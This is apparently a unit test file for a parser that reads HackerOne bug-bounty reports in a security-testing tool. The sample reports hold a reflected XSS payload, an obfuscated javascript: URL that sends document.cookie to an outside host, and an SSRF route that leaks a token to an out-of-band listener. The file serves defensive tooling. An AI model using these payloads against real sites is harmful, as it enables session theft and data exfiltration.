"""Unit tests for the HackerOne report parser."""

from __future__ import annotations

from dast.hackerone.parser import parse_report, H1Report


_XSS_REPORT = """Hi Security Team

I found xss "Reflected"

Url : https://us1.esi.acme-corp.com/

Proof Url: https://us1.esi.acme-corp.com/ui/signin.aspx?__LASTFOCUS=&hfHrmRedirect=%22%3e%3c%2fscript%3e%3cscript%3ealert%28%29%3c%2fscript%3e&tbEmail=&tbPassword=

Payload: `%22%3e%3c%2fscript%3e%3cscript%3ealert%28%29%3c%2fscript%3e`

Have a nice day
Regards,

## Impact
https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
"""

_DNS_REPORT = """SUMMARY :
DNS takeovers are typically more severe because they give the attacker more control.

DETECTION :
The misconfiguration occurs when we are using AWS Route53 service for managing the DNS
and the associated nameservers do not have the corresponding zone files.

STEPS TO REPRODUCE :
1) Dig bpt.acme-corp.com
2)You can see Dangling DNS NS Record

{F5906518}

3) Which is actually an aws route 53 Service

## Impact
A DNS zone takeover bug can have severe consequences.
"""

_SSRF_REPORT = """## Summary

A Server-Side Request Forgery (SSRF) vulnerability in the `data_ingest_service` microservice
leaks a static internal Bearer token to an attacker-controlled host.

## Vulnerability Details

### Root Cause 1: SSRF in data_ingest_service

Send an email to:
```
report--od-uxvh9qu6np1fd8spl51x94ijqaw1ku8j.oastify.com/@appsec.acme-corp.com
```

The OOB listener receives the internal token.

## Steps To Reproduce

GET /private/pipeline/validate?recipient=admin@example.com HTTP/1.1
Host: api-eu.billing.acme-corp.com
Authorization: Bearer token=eyJhbGciOiJIUzUxMiJ9...

## Impact
Complete compromise of all customer data.
"""


class TestXSSParsing:
    def test_vuln_type_xss(self):
        r = parse_report(_XSS_REPORT)
        assert r.vuln_type == "xss"

    def test_proof_url_extracted(self):
        r = parse_report(_XSS_REPORT)
        assert "us1.esi.acme-corp.com" in r.proof_url
        assert "hfHrmRedirect" in r.proof_url

    def test_target_url_is_base(self):
        r = parse_report(_XSS_REPORT)
        assert r.target_url.endswith(".aspx") or "signin" in r.target_url
        assert "hfHrmRedirect" not in r.target_url

    def test_payload_extracted_and_decoded(self):
        r = parse_report(_XSS_REPORT)
        # Should be URL-decoded
        assert "<script>" in r.payload or "script" in r.payload.lower()

    def test_all_urls_populated(self):
        r = parse_report(_XSS_REPORT)
        assert len(r.all_urls) > 0
        assert any("us1.esi.acme-corp.com" in u for u in r.all_urls)

    def test_raw_text_preserved(self):
        r = parse_report(_XSS_REPORT)
        assert "Reflected" in r.raw_text


class TestDNSParsing:
    def test_vuln_type_dns_takeover(self):
        r = parse_report(_DNS_REPORT)
        assert r.vuln_type == "dns_takeover"

    def test_domain_extracted(self):
        r = parse_report(_DNS_REPORT)
        # Should find bpt.acme-corp.com somewhere
        assert "acme-corp.com" in r.target_url or any("acme-corp.com" in u for u in r.all_urls)


class TestSSRFParsing:
    def test_vuln_type_ssrf(self):
        r = parse_report(_SSRF_REPORT)
        assert r.vuln_type == "ssrf"


class TestEdgeCases:
    def test_empty_report(self):
        r = parse_report("")
        assert isinstance(r, H1Report)
        assert r.vuln_type == "unknown"

    def test_no_url_report(self):
        r = parse_report("This is a bug report with no URLs mentioned.")
        assert r.proof_url == ""
        assert isinstance(r.all_urls, list)

    def test_multiple_urls_picks_best(self):
        text = """
        See https://example.com for context.

        Proof URL: https://example.com/api/v1/users?id=1&redirect=https://evil.com

        Reference: https://owasp.org/xss
        """
        r = parse_report(text)
        # Should prefer the longer URL with query params
        assert "api/v1" in r.proof_url or "evil" in r.proof_url

    def test_payload_in_backtick(self):
        text = """
        XSS found on search param.
        Payload: `<script>alert(1)</script>`
        URL: https://example.com/search?q=test
        """
        r = parse_report(text)
        assert r.vuln_type == "xss"
        assert "script" in r.payload.lower()

    def test_url_cleaned_of_trailing_punctuation(self):
        text = "Visit https://example.com/vuln?q=1."
        r = parse_report(text)
        assert r.all_urls
        assert not r.all_urls[0].endswith(".")


class TestUrlWithQuotedPayload:
    """
    Regression: a redirect/XSS proof URL embeds single quotes, parens and square
    brackets inside the query string (?url=javascript:top['location']='https://
    evil'+document.cookie). The URL matcher used to stop at the first single
    quote, truncating the proof URL to '...url=javascript:top[' — so the browser
    never received the real payload and validation always fell to manual review.
    """

    # Use a realistic (non-placeholder) target host: example.com is on the
    # parser's skip list, which would filter it out for unrelated reasons.
    _REPORT = (
        "I just found a Cross Site Scripting issue at your site https://partnersapply.acme-corp.com\n\n"
        "https://partnersapply.acme-corp.com/static/DownloadPage.html?url=javascript:top['loca'+'tion']="
        "'https://google.com?'+top['docu'+'ment']['cookie']+top['docu'+'ment']['domain']&filename=x\n\n"
        "Payload: victim clicks the link\n"
    )

    def test_regex_captures_full_url_with_single_quotes(self):
        from dast.hackerone.parser import _URL_RE
        urls = _URL_RE.findall(self._REPORT)
        longest = max(urls, key=len).rstrip(".,;:!?\"')")
        assert "top['docu'+'ment']['cookie']" in longest
        assert "acme-corp.com" in longest

    def test_parse_report_proof_url_not_truncated(self):
        r = parse_report(self._REPORT)
        # The proof URL must carry the whole payload, not stop at "top[".
        assert not r.proof_url.rstrip().endswith("javascript:top[")
        assert "cookie" in r.proof_url

    def test_cwe_label_map_coverage(self):
        from dast.agents.business_logic_agent import _cwe_for_type
        assert _cwe_for_type("numeric_boundary") == "CWE-840"
        assert _cwe_for_type("privilege_escalation") == "CWE-269"
        assert _cwe_for_type("workflow_bypass") == "CWE-841"
        assert _cwe_for_type("mass_assignment") == "CWE-915"
        assert _cwe_for_type("unknown_type") == "CWE-840"
